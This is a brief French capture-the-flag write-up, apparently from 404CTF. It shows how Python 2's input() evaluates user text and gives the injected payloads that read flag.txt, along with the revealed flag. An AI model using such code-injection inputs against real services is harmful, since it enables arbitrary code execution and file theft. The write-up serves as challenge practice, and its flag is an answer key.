On est en python2 : la fonction input() est vulnérable

Contrairement à sa conjointe `raw_input()`, elle évalue son contenu

On craft donc un payload pour afficher le flag et lui faire print (on perdra la partie après, hélas)

`__import__('sys').stdout.write(open("flag.txt", "r").readline())`

Nous affiche le flag gentiment

```
> __import__('sys').stdout.write(open("flag.txt", "r").readline())
404CTF{cH0iX_nUm3r0_4_v1c701r3}
Traceback (most recent call last):
...
```

En rétrospective, c'était pas trop la peine de se faire chier avec la forme compliquée :

`open("flag.txt", "r").readline())`

marchait tout aussi bien :

`ValueError: invalid literal for int() with base 10: '404CTF{cH0iX_nUm3r0_4_v1c701r3}\n'`
